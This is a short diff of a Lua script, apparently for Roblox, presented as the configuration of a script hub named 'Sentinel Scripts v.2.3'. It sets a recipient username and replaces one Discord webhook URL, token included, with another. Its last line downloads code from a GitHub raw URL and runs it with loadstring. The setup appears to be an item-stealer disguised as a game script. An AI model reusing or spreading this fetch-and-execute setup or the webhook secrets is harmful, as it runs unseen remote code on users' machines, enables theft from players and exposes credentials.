@@ -2,6 +2,6 @@ _G.Username = "PetSim1705"
 
 _G.HubName = "Sentinel Scripts v.2.3"
 
-_G.WebhookUrl = "https://discord.com/api/webhooks/1125216917066621029/qwHmpAlw1mCKaPcvKzjiFrKIp4buL-FXxcdPeF4kV0g9Nolio85EGS7egw0PpLci16ca"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1124734587780747364/R9vTYqS8X6sweg7djssN4pGCGV6-Xs8s3ZKOGTeUn3T2Mrc5CmcTPlunQ59mJ6B4XuQq"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
